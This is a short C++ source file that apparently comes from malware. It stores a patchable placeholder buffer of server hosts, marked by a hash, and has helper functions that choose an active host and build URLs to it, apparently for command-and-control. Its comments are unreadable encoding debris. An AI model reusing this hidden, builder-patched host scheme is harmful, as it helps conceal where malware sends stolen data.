//---------------------------------------------------------------------------
#pragma hdrstop



#include "Modules.h"


#ifdef AzConfigH
	//****************************************
	//   ���� ������� � ������ �������
	//   ���������� ��������� ���������
	//****************************************
	#define USE_AZ_CONFIG
#endif


#include "Strings.h"
#include "Config.h"
//-----------------------------------------------------------------------------



#ifdef USE_AZ_CONFIG

	char AZ_HOSTS[AZ_HOSTS_SIZE] = "__AZ_HOSTS__\0\0";

	#define AZ_HOSTS_HASH 0xE0203A42 /* __AZ_HOSTS__ */

#endif



string GetAzHost()
{
	// ������� ���������� ������ ������� ���� ��
	// ������� ������ ������� AZ
	#ifdef USE_AZ_CONFIG
		return GetActiveHostFromBuf2(AZ_HOSTS, AZ_HOSTS_HASH, true);
	#else
    	return GetActiveHost2();
	#endif
}
//-----------------------------------------------------------------------------

string GetAzURL(const char*  Path)
{
	//  ������� ���������� ������ ����� ��
	//  ������ ����� ������� � ����������� ����
	string Host = GetAzHost();
	if (Host.IsEmpty()) return Host;
	TURL URL;
	URL.Host = Host;
	URL.Path = Path;

    return URL.URL();
}
//-----------------------------------------------------------------------------

